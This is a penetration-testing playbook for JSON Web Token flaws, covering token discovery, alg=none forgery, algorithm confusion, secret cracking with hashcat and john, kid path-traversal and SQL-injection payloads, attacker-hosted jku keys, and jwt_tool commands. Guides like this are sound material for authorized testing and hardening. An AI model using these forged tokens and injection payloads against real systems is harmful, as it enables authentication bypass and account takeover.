# JWT (JSON Web Token) Vulnerabilities

> Modern apps stand or fall on JWT. The signing key, the algorithm, and
> the validation logic are three independent attack surfaces.

---

## Phase 1: Discovery

### Where JWTs live
- `Authorization: Bearer eyJ...` headers
- Cookies named `access_token`, `id_token`, `auth`, `jwt`, `session`
- Response bodies after login (`access_token`, `id_token`, `refresh_token`)
- WebSocket auth handshakes
- OAuth/OIDC flows: `id_token` in URL fragments / query strings

### Identification
JWT shape: 3 base64url segments separated by `.`. Decode each:
```
header   = base64url-decode(part1)  -> {"alg": "...", "kid": "...", "jku": "..."}
payload  = base64url-decode(part2)  -> claims
signature= base64url-decode(part3)  -> bytes
```

Important header fields to record as facts:
- `alg`: HS256 / RS256 / ES256 / **none**
- `kid`: key identifier (often a path/file/UUID)
- `jku`: URL to JWKS (potential SSRF + key confusion)
- `x5u`: URL to certificate chain
- `typ`, `cty`

---

## Phase 2: Attacks

### 2.1 alg=none
```python
header  = {"alg": "none", "typ": "JWT"}
payload = <unmodified or escalated>
token   = b64url(header) + "." + b64url(payload) + "."   # empty signature
```
Try with: `none`, `None`, `NONE`, `nOne`. Send. If accepted, that's a
critical bypass.

### 2.2 HS256/RS256 algorithm confusion
Many libraries take the same secret store and verify HS256 with whatever
key is available — including the public RSA key intended for RS256
verification. Steps:
1. Recover the server's RSA public key (from `jku` header URL, or from
   `/.well-known/jwks.json`, or just by looking for it in JS)
2. Forge a token with `alg=HS256`, sign it using the public key as the
   HMAC secret
3. Send. If validated, the lib is vulnerable.

### 2.3 Weak HMAC secret (HS256)
If `alg=HS256`, brute-force the secret offline:
```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
john --format=HMAC-SHA256 token.txt
```
Common defaults to try first: `secret`, `your-256-bit-secret`,
`changeme`, `password`, the application name.

### 2.4 kid injection
The `kid` (key id) header tells the server which key to load. If it's
unsanitized:
- **Path traversal**: `kid=../../../../dev/null` — server uses /dev/null
  as the HMAC key (empty), forge with empty key
- **SQL injection**: `kid=' UNION SELECT 'mykey'-- ` — server returns
  attacker-controlled key
- **Command injection in key lookup**: rare but happens

### 2.5 jku / x5u abuse
`jku` and `x5u` point to remote JWKS. If the server fetches them:
- Set `jku=http://<oob>/jwks.json` — confirms SSRF + that the server
  trusts attacker-supplied URLs
- If trusted: host a JWKS with your own public key, sign with your
  matching private key, server validates as if you were the issuer

### 2.6 Embedded jwk
Some libs honour an embedded `jwk` in the header. If they do:
1. Generate your own RSA keypair
2. Forge the token with `alg=RS256`, `jwk=<your_public_key>`,
   sign with your private key
3. Server reads `jwk` from the header and verifies with it. Accepted = total bypass.

### 2.7 Claim manipulation
Even with valid signature, broken validation:
- `exp` not checked → expired tokens accepted
- `aud` not checked → token from a sister service accepted
- `iss` not checked → token from any issuer
- `sub` swap → identity takeover
- `role` claim rewritable via mass assignment elsewhere

---

## Phase 3: Tooling
```bash
# Decode without verifying
jwt_tool <token>
# Or quickly:
echo "<part>" | base64 -d   # for each segment

# Common test runner
jwt_tool <token> -T   # tamper mode
jwt_tool <token> -X a # alg=none
jwt_tool <token> -X k # kid injection
```

If `jwt_tool` isn't installed in the container, do it manually with curl:
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '<modified payload json>' | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "${HEADER}.${PAYLOAD}."
```

---

## Phase 4: Verification + PoC

A JWT PoC is reportable when:
- The forged token is accepted in a privileged action (data read/write/admin)
- The action wouldn't have been possible with the original token

The validator should:
- Replay the forged token to confirm acceptance
- Counter-probe with a token where the SIGNATURE is corrupted but the
  rest is identical — if THAT also passes, signature isn't being verified
  at all (different bug, more severe)
